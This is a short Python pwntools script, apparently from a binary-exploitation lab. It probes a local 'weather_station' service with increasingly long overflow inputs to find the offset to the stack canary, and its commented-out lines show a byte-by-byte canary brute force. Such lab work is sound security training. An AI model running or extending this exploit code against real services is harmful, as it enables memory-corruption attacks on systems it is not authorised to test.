from pwn import *
import time


HOST, PORT = '127.0.0.1', 5555
elf = ELF('./weather_station', checksec=False)

#lab code for brute forcing the canary, modified for canary offset

#known = b"\x00"
#for i in range(7):
for canaryOff in range(48,256):
   # guess = known + bytes([bval])
    payload = b"A" * canaryOff
    io = remote(HOST, PORT, level='error')
    io.recvuntil(b"location: ")
    io.sendline(b"here")
    io.recvuntil(b"query: ")
    io.sendline(payload)
    try:
        data = io.recv(timeout=0.2)
    except EOFError:
        data = b""
        io.close()
    if b"stack smashing detected" in data:
    #known = guess
    #log.success(f"byte {i+1}: {bval:02x}")
        log.info(f"Canary offset is: {canaryOff-1}")
        OFFSET_TO_CANARY = canaryOff-1
        break

io.interactive()
